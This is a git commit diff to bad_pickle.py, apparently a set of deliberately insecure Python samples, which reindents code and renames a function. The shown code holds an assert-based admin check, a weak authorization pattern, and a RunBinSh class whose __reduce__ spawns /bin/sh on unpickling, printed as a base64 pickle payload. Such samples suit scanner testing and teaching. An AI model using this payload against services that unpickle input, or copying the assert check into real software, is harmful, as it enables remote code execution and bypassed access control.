1b0f760ddfde0c33669759b5a931f33383af92da
Roman Mariancik <42389110+maromcik@users.noreply.github.com>
2021-05-11 12:31:24 +0200

    Update bad_pickle.py

--- bad_pickle.py
+++ bad_pickle.py
@@ -12,15 +12,15 @@ def transcode_file(request, filename):
 
 
 # Assert statements
-def foo(request, user):
-   assert user.is_admin, 'user does not have access'
+def abc(request, user):
+    assert user.is_admin, 'user does not have access'
    # secure code...
 
 
 # Pickles
 class RunBinSh(object):
-  def __reduce__(self):
-    return (subprocess.Popen, (('/bin/sh',),))
+    def __reduce__(self):
+        return (subprocess.Popen, (('/bin/sh',),))
 
 
 print(base64.b64encode(cPickle.dumps(RunBinSh())))
